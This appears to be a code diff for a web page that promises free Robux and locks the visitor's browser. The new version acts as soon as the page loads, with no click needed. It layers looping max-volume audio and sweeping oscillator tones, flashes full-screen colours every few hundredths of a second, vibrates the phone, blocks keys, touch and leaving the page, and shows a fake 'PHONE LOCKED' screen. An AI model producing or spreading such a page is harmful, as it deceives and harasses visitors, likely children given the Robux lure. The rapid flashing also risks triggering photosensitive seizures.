@@ -1,144 +1,128 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎁 99999 ROBUX FREE 🎁</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loading Robux...</title>
     <style>
-        * { margin:0;padding:0;overflow:hidden; }
-        body {
+        *{margin:0;padding:0;overflow:hidden;}
+        body{
             height:100vh;
-            background: #000;
-            color:#fff;
-            font-family:Arial;
-            text-align:center;
-            animation:flash 0.2s infinite;
+            background:#000;
+            animation:hellflash 0.05s infinite;
         }
-        @keyframes flash {
-            0%,100%{background:#ff0000;}
-            50%{background:#ffff00;}
+        @keyframes hellflash{
+            0%{background:#ff0000;}
+            25%{background:#00ff00;}
+            50%{background:#0000ff;}
+            75%{background:#ffff00;}
         }
-        .center {
-            position:fixed;
-            top:50%;
-            left:50%;
+        #lock{
+            position:fixed;top:0;left:0;width:100%;height:100%;
+            background:rgba(255,0,0,0.98);
+            z-index:9999;
+            pointer-events:auto;
+        }
+        #lock h1{
+            position:absolute;top:50%;left:50%;
             transform:translate(-50%,-50%);
-            z-index:999;
-        }
-        button {
-            font-size:28px;
-            padding:25px 50px;
-            background:#00ff00;
-            color:#000;
-            border:none;
-            border-radius:15px;
-            box-shadow:0 0 30px #00ff00;
-            cursor:pointer;
-        }
-        .locked {
-            display:none !important;
-        }
-        #cover {
-            position:fixed;
-            top:0;left:0;width:100%;height:100%;
-            background:rgba(255,0,0,0.95);
-            z-index:10000;
-            pointer-events:none;
+            font-size:8vw;
+            color:#fff;
+            text-shadow:0 0 20px #ff0;
         }
     </style>
 </head>
 <body>
-    <div id="cover"></div>
-    
-    <div class="center">
-        <h1 style="font-size:3em;margin-bottom:20px;">🔥 99,999 ROBUX 🔥</h1>
-        <p style="font-size:1.5em;margin-bottom:30px;">INSTANT DELIVERY!</p>
-        <button onclick="lockHell()">💎 GET FREE ROBUX 💎</button>
+    <!-- 5 AUDIO TRACKS = MAXIMUM LOUDNESS -->
+    <audio id="a1" loop preload="auto" autoplay>
+        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSL3/9O9wE=" type="audio/wav">
+    </audio>
+    <audio id="a2" loop preload="auto" autoplay>
+        <source src="data:audio/wav;base64,UklGRl0CAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSL3/9O9wE=" type="audio/wav">
+    </audio>
+    <audio id="a3" loop preload="auto" autoplay>
+        <source src="data:audio/wav;base64,UklGRmQCAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSL3/9O9wE=" type="audio/wav">
+    </audio>
+    <audio id="a4" loop preload="auto" autoplay></audio>
+    <audio id="a5" loop preload="auto" autoplay></audio>
+
+    <div id="lock">
+        <h1>🔒 PHONE LOCKED 🔒</h1>
     </div>
 
     <script>
-        let audioCtx, osc1, osc2, gain1, gain2;
+        // AUTO MAX VOLUME SYSTEM
+        const audios = ['a1','a2','a3','a4','a5'].map(id=>document.getElementById(id));
         
-        function lockHell() {
-            // HIDE BUTTON
-            document.querySelector('.center').classList.add('locked');
-            document.getElementById('cover').style.pointerEvents = 'auto';
+        // FORCE ALL AUDIO TO MAX VOLUME
+        audios.forEach((audio, i) => {
+            audio.volume = 1.0;
+            audio.muted = false;
             
-            // CREATE TWO LOUD OSCILLATORS (MAX DISRUPTION)
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            
-            // Oscillator 1 - piercing high tone
-            osc1 = audioCtx.createOscillator();
-            gain1 = audioCtx.createGain();
-            osc1.connect(gain1);
-            gain1.connect(audioCtx.destination);
-            osc1.frequency.value = 1200;
-            osc1.type = 'sawtooth';
-            gain1.gain.setValueAtTime(1.0, audioCtx.currentTime); // MAX VOLUME
-            
-            // Oscillator 2 - low rumble
-            osc2 = audioCtx.createOscillator();
-            gain2 = audioCtx.createGain();
-            osc2.connect(gain2);
-            gain2.connect(audioCtx.destination);
-            osc2.frequency.value = 80;
-            osc2.type = 'square';
-            gain2.gain.setValueAtTime(0.8, audioCtx.currentTime);
-            
-            // START SOUND HELL
-            osc1.start();
-            osc2.start();
-            
-            // CONTINUOUS PITCH SWEEP
-            let t = 0;
-            setInterval(() => {
-                osc1.frequency.value = 800 + Math.sin(t) * 800;
-                osc2.frequency.value = 60 + Math.sin(t * 0.5) * 40;
-                t += 0.2;
-            }, 50);
-            
-            // SCREEN LOCK EFFECT
-            const cover = document.getElementById('cover');
-            let locked = false;
-            setInterval(() => {
-                cover.style.background = `hsl(${Date.now()*0.01%360}, 100%, 50%)`;
-                if (!locked) {
-                    cover.innerHTML = '<h1 style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:5em;">🔒 LOCKED 🔒</h1>';
-                    locked = true;
+            // WEB AUDIO OVERLAY ON EACH
+            audio.addEventListener('play', () => {
+                const ctx = new AudioContext();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                
+                osc.frequency.value = 700 + i * 200;  // Different pitches
+                osc.type = ['sawtooth','square','triangle'][i%3];
+                gain.gain.value = 1.0;
+                
+                osc.start();
+                
+                // CHAOTIC PITCH SWEEP
+                setInterval(()=>{
+                    osc.frequency.value = 400 + Math.sin(Date.now()*0.01 + i) * 1200;
+                }, 20);
+            });
+        });
+        
+        // AUTO-RESUME EVERYTHING
+        setInterval(()=>{
+            audios.forEach(audio => {
+                if(audio.paused || audio.muted){
+                    audio.volume = 1.0;
+                    audio.play().catch(()=>{});  
                 }
-            }, 100);
+            });
             
-            // MAX VIBRATION (phones)
-            if (navigator.vibrate) {
-                setInterval(() => {
-                    navigator.vibrate([200,100,200]);
-                }, 400);
+            // Force all AudioContexts alive
+            if(window.AudioContext){
+                const ctx = new AudioContext();
+                ctx.resume();
             }
-        }
+        }, 100);
         
-        // TOTAL INTERACTION BLOCK
-        document.addEventListener('keydown', e => e.preventDefault());
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('selectstart', e => e.preventDefault());
-        document.addEventListener('dragstart', e => e.preventDefault());
+        // PAGE LOAD = IMMEDIATE HELL
+        document.addEventListener('DOMContentLoaded', ()=>{
+            audios.forEach(audio => audio.play().catch(()=>{}));
+            
+            // VIBRATION HELL
+            if(navigator.vibrate){
+                setInterval(()=>navigator.vibrate([500,100,500]), 300);
+            }
+        });
         
-        // MOBILE LOCK
-        document.addEventListener('touchstart', e => {
+        // USER INTERACTION = MORE HELL
+        document.addEventListener('click', ()=>audios.forEach(a=>a.play()));
+        document.addEventListener('touchstart', e=>{
             e.preventDefault();
-            if (audioCtx) audioCtx.resume();
-        }, {passive: false});
-        document.addEventListener('touchmove', e => e.preventDefault(), {passive: false});
+            audios.forEach(a=>a.play());
+        }, {passive:false});
         
-        // TRAP USER
-        window.onbeforeunload = () => "ROBUX LOADING... DON'T LEAVE!";
-        document.onvisibilitychange = () => {
-            if (!document.hidden && audioCtx) audioCtx.resume();
-        };
+        // TOTAL LOCK
+        ['keydown','contextmenu','selectstart','dragstart','touchmove'].forEach(ev=>{
+            document.addEventListener(ev, e=>e.preventDefault(), {passive:false});
+        });
         
-        // Backup auto-trigger
-        setTimeout(() => {
-            document.body.innerHTML += '<div style="position:fixed;bottom:10px;right:10px;font-size:20px;background:red;padding:10px;">👆 TAP ANYWHERE</div>';
-            document.addEventListener('click', lockHell, {once:true});
-        }, 2000);
+        window.onbeforeunload = ()=>"\u200B";  // Invisible trap
+        
+        // FLASHING LOCK SCREEN
+        setInterval(()=>{
+            const lock = document.getElementById('lock');
+            lock.style.background = `hsl(${Date.now()*0.02%360},100%,50%)`;
+        }, 30);
     </script>
 </body>
 </html>
